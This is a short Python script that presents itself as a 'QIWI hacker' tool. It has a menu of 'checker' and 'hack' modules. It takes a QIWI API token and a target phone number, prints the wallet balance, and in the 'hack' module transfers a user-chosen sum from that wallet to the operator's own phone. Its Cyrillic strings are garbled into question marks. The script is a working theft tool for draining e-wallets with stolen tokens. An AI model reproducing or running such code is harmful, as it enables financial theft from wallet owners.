import os
import time
import requests
import sys
from termcolor import colored, cprint
from SimpleQIWI import *
import filecmp

time.sleep(5)
print("")
print("")
print("")
	
text = input(colored('cbf[qiwi/hacker]> ', 'red'))
I ="use checker"
T ="use hack"
G ="show optinals"
W ="help"

if text == W:
	
	action = input(colored("?????? ????????? ? ?????????????? ??/??? ", 'green'))
	if action == "??" or "??": 
		os.system("termux-open https://vk.com/shift_tv3")
	elif action == "???" or "???" :
		print(colored("use command: show optinals", 'blue'))
	
if text == G:
	print("")
	print("")
	print("")
	
	print(colored("=  modules:",  'green'))
	print(colored("|", 'blue'))
	print("=  use hack - hack QIWI ")
	print(colored("|", 'blue'))
	print("=  use checker - chek money to QIWI")
	print('')
	print('')
	print('')
	
if text == I:
	
	time.sleep(5)
	print("")
	print("")
	print("")

	token=input(colored('[cheker modules]>>', 'red') + colored('set token: ', 'blue'))

	phone=input(colored('[cheker modules]>>', 'red') + colored('set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)

	input()
	
elif text == T:
	
	print("DarkHacker") 
	
	time.sleep(5)
	print("")
	print("")
	print("")

	token=input(colored('[hack modules]>>', 'red') + colored('set token: ', 'blue'))

	phone=input(colored('[hack modules]>>', 'red') + colored('set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)
	
	your_phone=int(input(colored('[hack modules]>>', 'red') + colored('your phone: ', 'blue')))
	
	money=int(input(colored('[hack modules]>>', 'red') + colored('hack money: ', 'blue')))
	
	api.pay(account=your_phone, amount=money, comment='????? ???, ??? ??????? ???? ?????')

	print(api.balance)

	input()